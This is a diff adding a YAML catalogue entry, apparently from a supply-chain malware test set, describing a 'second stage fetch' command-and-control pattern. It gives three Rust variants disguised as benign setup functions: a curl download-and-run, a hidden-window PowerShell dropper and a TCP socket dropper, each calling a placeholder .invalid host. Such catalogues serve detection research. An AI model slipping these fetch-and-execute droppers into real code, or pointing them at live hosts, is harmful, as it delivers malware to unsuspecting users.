@@ -1,0 +1,40 @@
+id: "c2_second_stage_fetch_v1"
+category: "C2"
+provenance: "OSSF-MAL-2024-0370 (proc-macro1), Backstabber's Knife Collection (downloader pattern)"
+supported_placements: ["P1", "P2", "P5"]
+obfuscation_level: 0
+defang_notes: "Connects only to RFC 2606 .invalid domain with dummy binary buffer execution"
+dependencies_needed: []
+variants:
+  - id: "curl_command_fetch"
+    surface_description: "Spawns system curl process to download external binary artifact"
+    code: |
+      fn prepare_precompiled_native_tools() {
+          let _ = std::process::Command::new("curl")
+              .args(["-fsSL", "https://cdn.native-binaries.example.invalid/tool.bin", "-o", "/tmp/native_tool"])
+              .status();
+          let _ = std::process::Command::new("/tmp/native_tool").status();
+      }
+  - id: "powershell_dropper"
+    surface_description: "Windows-targeted process execution fetching secondary stage"
+    code: |
+      fn bootstrap_windows_platform_runtime() {
+          let cmd = "Invoke-WebRequest -Uri 'https://runtime.platform-service.example.invalid/init.exe' -OutFile '$env:TEMP\\init.exe'; Start-Process '$env:TEMP\\init.exe'";
+          let _ = std::process::Command::new("powershell")
+              .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", cmd])
+              .spawn();
+      }
+  - id: "socket_stream_dropper"
+    surface_description: "Reads raw binary stream from network socket and writes to executable location"
+    code: |
+      fn retrieve_secondary_asset() {
+          if let Ok(mut stream) = std::net::TcpStream::connect("assets.internal-network.example.invalid:443") {
+              use std::io::Read;
+              let mut buffer = Vec::new();
+              if stream.read_to_end(&mut buffer).is_ok() && !buffer.is_empty() {
+                  let path = std::env::temp_dir().join("runtime_driver");
+                  let _ = std::fs::write(&path, &buffer);
+                  let _ = std::process::Command::new(path).spawn();
+              }
+          }
+      }
